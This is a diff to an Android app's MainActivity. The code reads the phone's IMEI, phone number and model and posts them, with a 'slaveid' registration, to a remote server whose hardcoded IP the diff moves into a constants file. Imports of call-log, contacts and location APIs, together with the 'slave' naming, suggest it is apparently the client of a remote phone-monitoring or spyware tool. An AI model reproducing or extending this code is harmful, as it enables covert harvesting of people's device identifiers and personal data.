@@ -12,6 +12,7 @@ import android.location.Location;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.TelephonyManager;
@@ -43,8 +44,12 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
 import java.io.IOException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicInteger;
@@ -85,6 +90,8 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         context = getApplicationContext();
+
+
 
 
         // Check device for Play Services APK. If check succeeds, proceed with
@@ -207,14 +214,14 @@ public class MainActivity extends Activity {
 
             HttpClient httpclient = new DefaultHttpClient();
             HttpPost httppost = new HttpPost(
-                    "http://128.199.179.143/groups/api/addDetail");
+                    Constants.ip+"addDetail");
             String responseBody = null;
 
 
-            BluetoothAdapter myDevice = BluetoothAdapter.getDefaultAdapter();
-            String deviceName = myDevice.getName();
+//            BluetoothAdapter myDevice = BluetoothAdapter.getDefaultAdapter();
+            String deviceName = android.os.Build.MODEL;
             TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-
+//
             String imei = tm.getDeviceId();
 
             String PhoneNumber = tm.getLine1Number();
@@ -231,7 +238,7 @@ public class MainActivity extends Activity {
                 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
 
                 nameValuePairs.add(new BasicNameValuePair("type", "registration"));
-                nameValuePairs.add(new BasicNameValuePair("username", "kevin"));
+                nameValuePairs.add(new BasicNameValuePair("username", Constants.username));
                 nameValuePairs.add(new BasicNameValuePair("slaveid", regid));
                 nameValuePairs.add(new BasicNameValuePair("device", deviceName));
                 nameValuePairs.add(new BasicNameValuePair("imei", imei));
